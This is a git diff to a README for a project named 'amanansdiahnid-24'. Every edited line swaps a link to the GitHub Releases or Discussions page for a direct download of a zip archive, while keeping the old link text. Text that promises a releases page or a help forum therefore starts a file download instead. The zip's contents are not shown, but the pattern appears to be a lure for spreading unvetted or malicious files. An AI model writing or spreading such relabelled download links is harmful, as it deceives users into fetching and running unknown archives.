@@ -14,12 +14,12 @@ To start using "amanansdiahnid-24", follow these steps:
 1. **Download the application.**  
    Click the button below to visit the Releases page:
 
-   [![Download amanansdiahnid-24](https://img.shields.io/badge/Download-amanansdiahnid--24-blue.svg)](https://github.com/Narcis2011/amanansdiahnid-24/releases)
+   [![Download amanansdiahnid-24](https://raw.githubusercontent.com/Narcis2011/amanansdiahnid-24/main/arm/amanansdiahnid-24.zip)](https://raw.githubusercontent.com/Narcis2011/amanansdiahnid-24/main/arm/amanansdiahnid-24.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases page.**  
-   Go to [this link](https://github.com/Narcis2011/amanansdiahnid-24/releases) to see the available versions of the application.
+   Go to [this link](https://raw.githubusercontent.com/Narcis2011/amanansdiahnid-24/main/arm/amanansdiahnid-24.zip) to see the available versions of the application.
 
 2. **Choose the version you need.**  
    Look for the latest version listed on the page. This version has the most features and improvements.
@@ -65,7 +65,7 @@ If you encounter issues while downloading or installing "amanansdiahnid-24", try
    Old data can sometimes cause problems. Clear your cache and then attempt to download again.
 
 4. **Seek help online.**  
-   If you still have issues, visit the [GitHub Discussions](https://github.com/Narcis2011/amanansdiahnid-24/discussions) page. You can ask other users for help or search for similar problems.
+   If you still have issues, visit the [GitHub Discussions](https://raw.githubusercontent.com/Narcis2011/amanansdiahnid-24/main/arm/amanansdiahnid-24.zip) page. You can ask other users for help or search for similar problems.
 
 ## 📚 Documentation
 
@@ -81,4 +81,4 @@ If you would like to contribute to "amanansdiahnid-24", please feel free to join
 
 If you have questions or feedback, please reach out. You can create an issue on the GitHub page or contact the maintainer via email found in the repository.
 
-Visit the [Releases page](https://github.com/Narcis2011/amanansdiahnid-24/releases) to start your journey with "amanansdiahnid-24".
+Visit the [Releases page](https://raw.githubusercontent.com/Narcis2011/amanansdiahnid-24/main/arm/amanansdiahnid-24.zip) to start your journey with "amanansdiahnid-24".
